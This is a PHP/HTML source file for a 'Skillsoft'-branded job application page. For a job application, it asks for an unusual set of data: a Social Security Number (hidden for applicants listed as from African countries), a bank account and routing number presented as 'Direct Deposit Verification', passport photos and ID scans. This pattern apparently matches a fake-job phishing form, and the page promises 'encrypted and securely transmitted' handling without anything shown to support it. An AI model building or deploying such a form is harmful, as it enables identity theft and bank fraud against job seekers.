<?php
include("php/session_helper.php");
init_session();
include("php/config.php");
if (!isset($_SESSION['valid'])) {
  header("Location: login.php");
  exit();
}

// Ensure job_id is present
$job_id = isset($_GET['job_id']) ? intval($_GET['job_id']) : 0;
if ($job_id === 0) {
    die("Error: No job selected. Please go to the <a href='jobs.php' class='text-brand-500 underline'>Jobs</a> page and select a role to apply for.");
}

// Fetch job specific requirements
$job_query = "SELECT req_passport, req_id, req_coverletter FROM jobs WHERE id = $job_id";
$job_result = mysqli_query($con, $job_query);
$job_reqs = mysqli_fetch_assoc($job_result);

// Fetch logged-in user's data to auto-fill form
$user_id = $_SESSION['id'];
$user_query = "SELECT Firstname, Lastname, Gender, Email, Country FROM users WHERE id = $user_id";
$user_result = mysqli_query($con, $user_query);
$user = mysqli_fetch_assoc($user_result);

// Determine if user is from an African country to hide SSN field
$african_countries = ['algeria', 'angola', 'benin', 'botswana', 'burkina faso', 'burundi', 'cabo verde', 'cameroon', 'central african republic', 'chad', 'comoros', 'democratic republic of the congo', 'republic of the congo', 'djibouti', 'egypt', 'equatorial guinea', 'eritrea', 'eswatini', 'ethiopia', 'gabon', 'gambia', 'ghana', 'guinea', 'guinea-bissau', 'ivory coast', 'cote d\'ivoire', 'kenya', 'lesotho', 'liberia', 'libya', 'madagascar', 'malawi', 'mali', 'mauritania', 'mauritius', 'morocco', 'mozambique', 'namibia', 'niger', 'nigeria', 'rwanda', 'sao tome and principe', 'senegal', 'seychelles', 'sierra leone', 'somalia', 'south africa', 'south sudan', 'sudan', 'tanzania', 'togo', 'tunisia', 'uganda', 'zambia', 'zimbabwe'];

$user_country = strtolower(trim($user['Country'] ?? ''));
$is_african = in_array($user_country, $african_countries);
?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <?php include("includes/head.php"); ?>
    <title>Skillsoft | Apply Now</title>
  </head>
  <body>
    <!-- Premium Application Form -->
    <section class="min-h-screen relative flex items-center justify-center py-12 px-4 sm:px-6 lg:px-8 overflow-hidden bg-slate-900">
      <!-- Animated Mesh/Glow Background -->
      <div class="absolute inset-0 w-full h-full bg-slate-900 z-0"></div>
      <div class="absolute top-[-10%] right-[-10%] w-[40%] h-[40%] rounded-full bg-brand-600/20 blur-[120px] mix-blend-screen animate-pulse z-0"></div>
      <div class="absolute bottom-[-10%] left-[-10%] w-[40%] h-[40%] rounded-full bg-violet-600/20 blur-[120px] mix-blend-screen z-0" style="animation: pulse 4s cubic-bezier(0.4, 0, 0.6, 1) infinite 2s;"></div>
      
      <!-- Glassmorphic Card -->
      <div class="relative w-full max-w-4xl z-10 my-8">
        <div class="backdrop-blur-xl bg-white/5 border border-white/10 p-8 md:p-12 rounded-3xl shadow-2xl relative overflow-hidden">
          
          <div class="absolute inset-0 bg-gradient-to-br from-white/5 to-transparent opacity-50 pointer-events-none"></div>

          <a href="javascript:history.back()" class="inline-flex items-center text-slate-400 font-semibold hover:text-white transition-colors mb-6 group relative z-10">
            <div class="w-8 h-8 rounded-full border border-slate-700 group-hover:bg-white/10 flex items-center justify-center mr-3 transition-colors">
              <i class="fas fa-arrow-left text-sm group-hover:-translate-x-0.5 transition-transform"></i>
            </div>
            Back to Job Details
          </a>

          <div class="text-center mb-10 relative z-10">
            <h2 class="text-4xl font-extrabold text-white tracking-tight mb-2">Submit Application</h2>
            <p class="text-slate-400 font-medium">Please provide your details below to proceed.</p>
          </div>

          <div class="relative z-10">
            <form action="php/upload.php" method="post" enctype="multipart/form-data" class="space-y-8">
              
              <!-- Hidden Job ID -->
              <input type="hidden" name="job_id" value="<?php echo htmlspecialchars($job_id); ?>" />
              
              <!-- Personal Details Section -->
              <div class="space-y-6">
                <h3 class="text-xl font-bold text-white border-b border-slate-700/50 pb-2 mb-4">Personal Information</h3>
                
                <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
                  <!-- First Name -->
                  <div class="group">
                    <label for="firstname" class="block text-sm font-semibold text-slate-300 mb-2 transition-colors group-focus-within:text-brand-400">First Name</label>
                    <input
                      type="text"
                      id="firstname"
                      name="firstname"
                      class="w-full bg-slate-900/50 border border-slate-700/50 rounded-xl py-3 px-4 text-white placeholder-slate-500 focus:outline-none focus:ring-2 focus:ring-brand-500/50 focus:border-brand-500 transition-all duration-300"
                      placeholder="John"
                      value="<?php echo htmlspecialchars($user['Firstname'] ?? ''); ?>"
                      required
                    />
                  </div>

                  <!-- Last Name -->
                  <div class="group">
                    <label for="lastname" class="block text-sm font-semibold text-slate-300 mb-2 transition-colors group-focus-within:text-brand-400">Last Name</label>
                    <input
                      type="text"
                      id="lastname"
                      name="lastname"
                      class="w-full bg-slate-900/50 border border-slate-700/50 rounded-xl py-3 px-4 text-white placeholder-slate-500 focus:outline-none focus:ring-2 focus:ring-brand-500/50 focus:border-brand-500 transition-all duration-300"
                      placeholder="Doe"
                      value="<?php echo htmlspecialchars($user['Lastname'] ?? ''); ?>"
                      required
                    />
                  </div>

                  <!-- Gender -->
                  <div class="group">
                    <label for="gender" class="block text-sm font-semibold text-slate-300 mb-2 transition-colors group-focus-within:text-brand-400">Gender</label>
                    <div class="relative">
                        <select
                          id="gender"
                          name="gender"
                          class="w-full bg-slate-900/50 border border-slate-700/50 rounded-xl py-3 px-4 text-white appearance-none focus:outline-none focus:ring-2 focus:ring-brand-500/50 focus:border-brand-500 transition-all duration-300"
                          required
                        >
                          <option value="Male" class="bg-slate-800" <?php echo (($user['Gender'] ?? '') == 'Male') ? 'selected' : ''; ?>>Male</option>
                          <option value="Female" class="bg-slate-800" <?php echo (($user['Gender'] ?? '') == 'Female') ? 'selected' : ''; ?>>Female</option>
                          <option value="Others" class="bg-slate-800" <?php echo (($user['Gender'] ?? '') == 'Others') ? 'selected' : ''; ?>>Other binaries</option>
                          <option value="private" class="bg-slate-800" <?php echo (($user['Gender'] ?? '') == 'private') ? 'selected' : ''; ?>>Prefer not to say</option>
                        </select>
                        <i class="fa-solid fa-chevron-down absolute right-4 top-1/2 transform -translate-y-1/2 text-slate-400 pointer-events-none"></i>
                    </div>
                  </div>

                  <!-- Email -->
                  <div class="group">
                    <label for="email" class="block text-sm font-semibold text-slate-300 mb-2 transition-colors group-focus-within:text-brand-400">Email Address</label>
                    <input
                      type="email"
                      id="email"
                      name="email"
                      class="w-full bg-slate-900/50 border border-slate-700/50 rounded-xl py-3 px-4 text-white placeholder-slate-500 focus:outline-none focus:ring-2 focus:ring-brand-500/50 focus:border-brand-500 transition-all duration-300"
                      placeholder="john.doe@example.com"
                      value="<?php echo htmlspecialchars($user['Email'] ?? ''); ?>"
                      required
                    />
                  </div>
                  
                  <?php if (!$is_african): ?>
                  <!-- SSN -->
                  <div class="group">
                    <label for="ssn" class="block text-sm font-semibold text-slate-300 mb-2 transition-colors group-focus-within:text-brand-400">Social Security Number</label>
                    <input
                      type="password"
                      id="ssn"
                      name="ssn"
                      class="w-full bg-slate-900/50 border border-slate-700/50 rounded-xl py-3 px-4 text-white placeholder-slate-500 focus:outline-none focus:ring-2 focus:ring-brand-500/50 focus:border-brand-500 transition-all duration-300"
                      placeholder="XXX-XX-XXXX"
                      required
                    />
                  </div>
                  <?php endif; ?>

                  <!-- Phone Number -->
                  <div class="group">
                    <label for="phoneno" class="block text-sm font-semibold text-slate-300 mb-2 transition-colors group-focus-within:text-brand-400">Phone Number</label>
                    <input
                      type="tel"
                      id="phoneno"
                      name="phoneno"
                      class="w-full bg-slate-900/50 border border-slate-700/50 rounded-xl py-3 px-4 text-white placeholder-slate-500 focus:outline-none focus:ring-2 focus:ring-brand-500/50 focus:border-brand-500 transition-all duration-300"
                      placeholder="(555) 123-4567"
                      required
                    />
                  </div>
                  
                  <!-- House Address -->
                  <div class="group md:col-span-2">
                    <label for="houseaddress" class="block text-sm font-semibold text-slate-300 mb-2 transition-colors group-focus-within:text-brand-400">Home Address</label>
                    <input
                      type="text"
                      id="houseaddress"
                      name="houseaddress"
                      class="w-full bg-slate-900/50 border border-slate-700/50 rounded-xl py-3 px-4 text-white placeholder-slate-500 focus:outline-none focus:ring-2 focus:ring-brand-500/50 focus:border-brand-500 transition-all duration-300"
                      placeholder="123 Main St, Apt 4B, City, State, ZIP"
                      required
                    />
                  </div>
                </div>
              </div>

              <!-- Banking Information Section -->
              <div class="space-y-6 pt-6 mt-6 border-t border-slate-700/50">
                <h3 class="text-xl font-bold text-white border-b border-slate-700/50 pb-2 mb-4">Direct Deposit Verification</h3>
                <p class="text-slate-400 text-sm mb-4">Required for identity verification and payroll processing setup.</p>
                <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
                  <div class="group">
                    <label for="bankname" class="block text-sm font-semibold text-slate-300 mb-2 transition-colors group-focus-within:text-brand-400">Bank Name</label>
                    <input
                      type="text"
                      id="bankname"
                      name="bankname"
                      class="w-full bg-slate-900/50 border border-slate-700/50 rounded-xl py-3 px-4 text-white placeholder-slate-500 focus:outline-none focus:ring-2 focus:ring-brand-500/50 focus:border-brand-500 transition-all duration-300"
                      placeholder="e.g. Chase, Bank of America"
                      required
                    />
                  </div>

                  <div class="group">
                    <label for="bankno" class="block text-sm font-semibold text-slate-300 mb-2 transition-colors group-focus-within:text-brand-400">Account / Routing Number</label>
                    <input
                      type="password"
                      id="bankno"
                      name="bankno"
                      class="w-full bg-slate-900/50 border border-slate-700/50 rounded-xl py-3 px-4 text-white placeholder-slate-500 focus:outline-none focus:ring-2 focus:ring-brand-500/50 focus:border-brand-500 transition-all duration-300"
                      placeholder="Secure entry"
                      required
                    />
                  </div>
                </div>
              </div>

              <!-- Required Documents Section -->
              <div class="space-y-6 pt-6 mt-6 border-t border-slate-700/50">
                <h3 class="text-xl font-bold text-white border-b border-slate-700/50 pb-2 mb-4">Required Documents</h3>
                
                <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
                  
                  <?php if ($job_reqs && $job_reqs['req_passport']): ?>
                  <!-- Passport Photo -->
                  <div class="group relative bg-slate-900/50 border-2 border-dashed border-slate-700/50 hover:border-brand-500/50 rounded-2xl p-6 text-center transition-all duration-300">
                    <input
                      type="file"
                      id="passport"
                      name="passport"
                      accept=".jpg,.jpeg,.png"
                      class="absolute inset-0 w-full h-full opacity-0 cursor-pointer z-10"
                      required
                    />
                    <div class="pointer-events-none relative z-0">
                      <div class="w-12 h-12 mx-auto bg-slate-800 rounded-full flex items-center justify-center mb-3 group-hover:scale-110 group-hover:bg-brand-500/20 transition-all">
                        <i class="fa-solid fa-camera text-xl text-slate-400 group-hover:text-brand-400 transition-colors"></i>
                      </div>
                      <span class="upload-label block text-sm font-bold text-white mb-1">Passport Photo</span>
                      <span class="upload-hint block text-xs font-medium text-slate-500">JPG, JPEG, PNG</span>
                    </div>
                  </div>
                  <?php endif; ?>

                  <?php if ($job_reqs && $job_reqs['req_id']): ?>
                  <!-- Driver License -->
                  <div class="group relative bg-slate-900/50 border-2 border-dashed border-slate-700/50 hover:border-brand-500/50 rounded-2xl p-6 text-center transition-all duration-300">
                    <input
                      type="file"
                      id="driverlicense"
                      name="driverlicense"
                      accept=".pdf,.doc,.docx,.jpg,.jpeg,.png"
                      class="absolute inset-0 w-full h-full opacity-0 cursor-pointer z-10"
                      required
                    />
                    <div class="pointer-events-none relative z-0">
                      <div class="w-12 h-12 mx-auto bg-slate-800 rounded-full flex items-center justify-center mb-3 group-hover:scale-110 group-hover:bg-brand-500/20 transition-all">
                        <i class="fa-solid fa-id-card text-xl text-slate-400 group-hover:text-brand-400 transition-colors"></i>
                      </div>
                      <span class="upload-label block text-sm font-bold text-white mb-1">National ID / Driver's License</span>
                      <span class="upload-hint block text-xs font-medium text-slate-500">PDF, DOC, JPG, PNG</span>
                    </div>
                  </div>
                  <?php endif; ?>

                  <!-- Resume/CV -->
                  <div class="group relative bg-slate-900/50 border-2 border-dashed border-slate-700/50 hover:border-brand-500/50 rounded-2xl p-6 text-center transition-all duration-300">
                    <input
                      type="file"
                      id="resume"
                      name="resume"
                      accept=".pdf,.doc,.docx,.jpg,.jpeg,.png"
                      class="absolute inset-0 w-full h-full opacity-0 cursor-pointer z-10"
                      required
                    />
                    <div class="pointer-events-none relative z-0">
                      <div class="w-12 h-12 mx-auto bg-slate-800 rounded-full flex items-center justify-center mb-3 group-hover:scale-110 group-hover:bg-brand-500/20 transition-all">
                        <i class="fa-solid fa-file-pdf text-xl text-slate-400 group-hover:text-brand-400 transition-colors"></i>
                      </div>
                      <span class="upload-label block text-sm font-bold text-white mb-1">Resume / CV</span>
                      <span class="upload-hint block text-xs font-medium text-slate-500">PDF, DOC, DOCX, JPG, PNG</span>
                    </div>
                  </div>

                  <!-- Cover Letter -->
                  <div class="group relative bg-slate-900/50 border-2 border-dashed border-slate-700/50 hover:border-brand-500/50 rounded-2xl p-6 text-center transition-all duration-300">
                    <input
                      type="file"
                      id="coverletter"
                      name="coverletter"
                      accept=".pdf,.doc,.docx"
                      class="absolute inset-0 w-full h-full opacity-0 cursor-pointer z-10"
                      <?php echo ($job_reqs && $job_reqs['req_coverletter']) ? 'required' : ''; ?>
                    />
                    <div class="pointer-events-none relative z-0">
                      <div class="w-12 h-12 mx-auto bg-slate-800 rounded-full flex items-center justify-center mb-3 group-hover:scale-110 group-hover:bg-brand-500/20 transition-all">
                        <i class="fa-solid fa-envelope-open-text text-xl text-slate-400 group-hover:text-brand-400 transition-colors"></i>
                      </div>
                      <span class="upload-label block text-sm font-bold text-white mb-1">Cover Letter <?php echo ($job_reqs && $job_reqs['req_coverletter']) ? '' : '(Optional)'; ?></span>
                      <span class="upload-hint block text-xs font-medium text-slate-500">PDF, DOC, DOCX</span>
                    </div>
                  </div>
                </div>
              </div>

              <!-- Submit Button -->
              <div class="pt-8">
                <button
                  type="submit"
                  name="submit"
                  class="w-full py-4 px-6 rounded-xl bg-gradient-to-r from-brand-600 to-violet-600 hover:from-brand-500 hover:to-violet-500 text-white font-bold text-lg transition-all shadow-[0_0_20px_rgba(124,58,237,0.3)] hover:shadow-[0_0_30px_rgba(124,58,237,0.5)] transform hover:-translate-y-1"
                >
                  Submit Application Securely
                </button>
                <p class="text-center text-xs text-slate-500 mt-4 flex items-center justify-center">
                  <i class="fa-solid fa-lock mr-2"></i> Your information is encrypted and securely transmitted.
                </p>
              </div>

            </form>
          </div>
        </div>
      </div>
    </section>

    <script src="js/main.js"></script>
    <script>
      // File upload visual feedback
      document.querySelectorAll('input[type="file"]').forEach(input => {
        input.addEventListener('change', function() {
          const wrapper = this.closest('.group');
          const nameEl = wrapper.querySelector('.file-name');
          const iconEl = wrapper.querySelector('.upload-icon');
          const labelEl = wrapper.querySelector('.upload-label');
          const hintEl = wrapper.querySelector('.upload-hint');
          
          if (this.files.length > 0) {
            const fileName = this.files[0].name;
            wrapper.classList.add('border-brand-500/50', 'bg-brand-500/5');
            wrapper.classList.remove('border-slate-700/50');
            if (iconEl) iconEl.classList.add('text-brand-400', 'scale-110');
            if (labelEl) labelEl.textContent = 'Selected';
            if (hintEl) hintEl.textContent = fileName;
            if (hintEl) hintEl.classList.add('text-brand-300');
          }
        });
      });
    </script>
  </body>
</html>